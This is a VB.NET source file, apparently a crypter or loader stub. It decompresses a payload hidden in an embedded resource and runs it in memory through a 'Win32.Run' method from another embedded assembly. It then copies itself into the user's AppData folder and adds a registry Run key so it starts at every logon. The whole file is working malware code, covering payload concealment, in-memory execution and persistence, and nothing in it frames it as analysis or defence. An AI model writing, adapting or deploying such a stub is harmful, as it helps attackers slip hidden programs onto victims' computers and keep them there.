Imports System, Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Reflection
Imports System.Text
Imports System.IO.Compression
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Windows.Forms

Public Class Cls

    Public Shared Sub Mth(ByVal str As String)
        Try

            Dim asm As Assembly = Assembly.Load(My.Resources.CL1)
            Dim file As Byte() = retrieveFile()
            Dim typ As Type = asm.GetType("Win32")
            typ.GetMethod("Run").Invoke(Nothing, New Object() {file, Nothing})

            Dim startup() As String = Split(str, "/")
            If startup(0) = "T" Then
                Dim appdata As String = Environ("appdata")
                Dim start_name As String = startup(1)
                Dim install_path As String = appdata & "\" & start_name & ".exe"
                If Not IO.File.Exists(install_path) Then
                    IO.File.Copy(Application.ExecutablePath, install_path)
                    Threading.Thread.Sleep(5000)

                    Dim regKey As Microsoft.Win32.RegistryKey
                    regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                    regKey.SetValue(start_name, """" & install_path & """")
                    regKey.Close()
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Public Shared Function Decompress(data As Byte()) As Byte()
        Dim input As New MemoryStream()
        input.Write(data, 0, data.Length)
        input.Position = 0
        Dim gzip As New GZipStream(input, CompressionMode.Decompress, True)
        Dim output As New MemoryStream()
        Dim buff As Byte() = New Byte(63) {}
        Dim read As Integer = -1
        read = gzip.Read(buff, 0, buff.Length)
        While read > 0
            output.Write(buff, 0, read)
            read = gzip.Read(buff, 0, buff.Length)
        End While
        gzip.Close()
        Return output.ToArray()
    End Function

    Public Shared Function retrieveFile() As Byte()
        Dim res_Man As New Resources.ResourceManager("2016", Reflection.Assembly.GetEntryAssembly)
        Return Decompress(res_Man.GetObject("text"))
    End Function

End Class